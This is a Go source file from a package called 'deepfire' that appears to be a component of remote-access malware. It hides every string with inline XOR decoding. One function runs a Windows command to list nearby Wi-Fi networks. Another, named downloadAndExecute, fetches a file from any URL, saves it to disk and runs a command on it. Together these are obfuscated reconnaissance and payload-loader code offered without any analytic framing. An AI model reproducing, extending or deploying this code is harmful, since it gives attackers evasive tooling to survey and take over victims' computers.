package deepfire

import (
	"io"
	"net/http"
	"os"
	"strings"
)

func networks() ([]string, error) {
	wifi_names := []string{}

	out, err := cmdOut((func() string {
mask := []byte("\x2f\x2e\x5e\x6d\x03\xc6\xb1\xfe\x3a\xae\x99\x3c\x47\x91\x34\x15\x1c\x95\xe4\xd1\xd0\xc0\xe7\xfd")
maskedStr := []byte("\x41\x4b\x2a\x1e\x6b\xe6\xc6\x92\x5b\xc0\xb9\x4f\x2f\xfe\x43\x35\x72\xf0\x90\xa6\xbf\xb2\x8c\x8e")
res := make([]byte, 24)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	if err != nil {
		return nil, err
	}
	o := strings.Split(out, (func() string {
mask := []byte("\x66")
maskedStr := []byte("\x6c")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))[1:]
	for entry := range o {
		e := o[entry]
		if strings.Contains(e, (func() string {
mask := []byte("\x35\x33\xc3\x03")
maskedStr := []byte("\x66\x60\x8a\x47")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())) {
			wifi_name := strings.Split(e, (func() string {
mask := []byte("\xaa")
maskedStr := []byte("\x90")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))[1]
			wifi_names = append(wifi_names, wifi_name)
		}
	}

	return wifi_names, nil
}

func downloadAndExecute(url string, cmd string) (string, error) {
	splitted := strings.Split(url, (func() string {
mask := []byte("\x77")
maskedStr := []byte("\x58")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	filename := splitted[len(splitted)-1]

	f, err := os.Create(filename)
	if err != nil {
		return (func() string {
mask := []byte("\xcc\x1c\x77\x92\xb9\xa2")
maskedStr := []byte("\xaa\x7d\x1e\xfe\xdc\xc6")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err
	}
	defer f.Close()

	response, err := http.Get(url)
	if err != nil {
		return (func() string {
mask := []byte("\xd7\xe4\xea\xd1\x4a\x74")
maskedStr := []byte("\xb1\x85\x83\xbd\x2f\x10")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err
	}
	defer response.Body.Close()

	_, err = io.Copy(f, response.Body)
	if err != nil {
		return (func() string {
mask := []byte("\xf4\x05\x4c\xcb\xbf\xeb")
maskedStr := []byte("\x92\x64\x25\xa7\xda\x8f")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err
	}
	_cmd := strings.Replace(cmd, (func() string {
mask := []byte("\x98\x20\x8f\x77\x4d\xaa")
maskedStr := []byte("\xc3\x46\xe6\x1b\x28\xf7")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), filename, 1)
	out, er := CmdOut(_cmd)
	return out, er
}
